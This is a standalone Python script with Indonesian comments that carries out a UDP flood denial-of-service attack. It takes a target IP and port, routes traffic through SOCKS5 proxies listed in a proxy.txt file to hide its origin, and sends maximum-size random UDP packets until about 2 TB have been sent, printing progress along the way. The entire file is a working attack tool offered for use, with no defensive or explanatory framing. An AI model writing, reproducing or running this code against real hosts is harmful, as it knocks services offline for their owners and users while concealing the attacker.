#!/usr/bin/python3
import socket
import socks  # PySocks library untuk mendukung SOCKS proxy
import random
import sys
import time

if len(sys.argv) != 3:
    sys.exit('Usage: python3 f.py <target_ip> <target_port>')

# Parameter Target
target_ip = sys.argv[1]
target_port = int(sys.argv[2])
packet_size = 65507  # Ukuran maksimal paket UDP dalam bytes
total_data = 2 * 1024 * 1024 * 1024 * 1024  # 2TB dalam bytes
total_packets = total_data // packet_size  # Total paket

print(f"Flooding target: {target_ip}:{target_port or 'random'} with {packet_size} bytes per packet for 2TB data")
print(f"Total packets: {total_packets}")

# Muat daftar proxy dari file proxy.txt
try:
    with open("proxy.txt", "r") as proxy_file:
        proxies = [line.strip() for line in proxy_file.readlines()]
except FileNotFoundError:
    sys.exit("Error: proxy.txt file not found. Please provide a list of proxies.")

if not proxies:
    sys.exit("Error: proxy.txt is empty. Please provide valid proxies.")

print(f"Loaded {len(proxies)} proxies from proxy.txt.")

# Fungsi untuk membuat koneksi dengan proxy
def create_proxy_connection(proxy):
    try:
        proxy_host, proxy_port = proxy.split(":")
        proxy_port = int(proxy_port)

        sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)  # Socket UDP
        sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port)  # Gunakan SOCKS5 proxy
        return sock
    except Exception as e:
        print(f"Error setting proxy {proxy}: {e}")
        return None

# Fungsi untuk melakukan UDP Flood
def udp_flood():
    sent_packets = 0
    start_time = time.time()

    for proxy in proxies:
        sock = create_proxy_connection(proxy)
        if not sock:
            continue

        print(f"Using proxy: {proxy}")
        bytes = random._urandom(packet_size)  # Payload besar

        try:
            while sent_packets < total_packets:
                sock.sendto(bytes, (target_ip, target_port))
                sent_packets += 1

                # Laporan progres setiap 1 juta paket
                if sent_packets % 1_000_000 == 0:
                    elapsed_time = time.time() - start_time
                    gb_sent = (sent_packets * packet_size) / (1024 ** 3)
                    print(f"Sent: {sent_packets}/{total_packets} packets ({gb_sent:.2f} GB) in {elapsed_time:.2f} seconds")

            print(f"Finished sending with proxy: {proxy}")
            sock.close()

        except Exception as e:
            print(f"Error during flood with proxy {proxy}: {e}")

    print(f"DONE - 2TB Data Sent using {len(proxies)} proxies.")

# Panggil fungsi UDP Flood
udp_flood()
